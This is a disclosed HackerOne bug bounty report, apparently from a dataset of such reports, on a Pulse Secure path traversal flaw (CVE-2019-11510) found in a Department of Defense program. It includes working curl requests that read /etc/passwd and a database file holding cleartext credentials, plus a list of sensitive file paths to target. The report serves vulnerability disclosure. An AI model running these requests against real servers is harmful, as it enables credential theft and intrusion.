---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '671749'
original_report_id: '671749'
title: Pulse Secure File disclosure, clear text and potential RCE
weakness: OS Command Injection
team_handle: deptofdefense
created_at: '2019-08-12T14:34:14.634Z'
disclosed_at: '2019-12-02T19:29:23.319Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 31
tags:
- hackerone
- os-command-injection
---

# Pulse Secure File disclosure, clear text and potential RCE

## Metadata

- HackerOne Report ID: 671749
- Weakness: OS Command Injection
- Program: deptofdefense
- Disclosed At: 2019-12-02T19:29:23.319Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

**Summary:**
Pulse Secure has two main vulnerabilities that allow file disclosure and post auth RCE
**Description:**
CVE-2019-11510  is a file disclosure due to some normalization issues in pulse secure. I was able to reproduce this by  grabbing in the etc/passswd. 
https://$hax/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/#

Though the impact of that is very limited, medium to high sec at best. From here we can grab a specific file.

The file /data/runtime/mtmp/lmdb/dataa/data.mdb contains clear context passwords and usernames, when a user logs in from here we can then access the Pulse secure instance. I stopped here due to not wanting to break the rules of engagements but from here I would log in then exploit a Post auth exploit.


Here's a list of files that an attacker would instantly hit
/data/runtime/mtmp/system
/data/runtime/mtmp/lmdb/dataa/data.mdb
/data/runtime/mtmp/lmdb/dataa/lock.mdb
/data/runtime/mtmp/lmdb/randomVal/data.mdb
/data/runtime/mtmp/lmdb/randomVal/lock.mdb
## Impact
Critical 
## Step-by-step Reproduction Instructions
We can only do this  using due to browsers messing up the exploit

curl --path-as-is -k -D- https://████████/dana-na/../dana/html5acc/guacamole/../../../../../../data/runtime/mtmp/lmdb/dataa/data.mdb?/dana/html5acc/guacamole/#

 curl --path-as-is -k -D- https://████████/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/#

 curl --path-as-is -k -D- https://███/dana-na/../dana/html5acc/guacamole/../../../../../../data/runtime/mtmp/lmdb/dataa/data.mdb?/dana/html5acc/guacamole/#

## Product, Version, and Configuration (If applicable)
Pulse Secure
## Suggested Mitigation/Remediation Actions
Patch pulse immediately

## Impact

An attacker will be able to download internal files and specifically target a local file which stores clear text passwords when a user login. This also an attacker to access highly sensitive internal areas and even can perform command execution

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
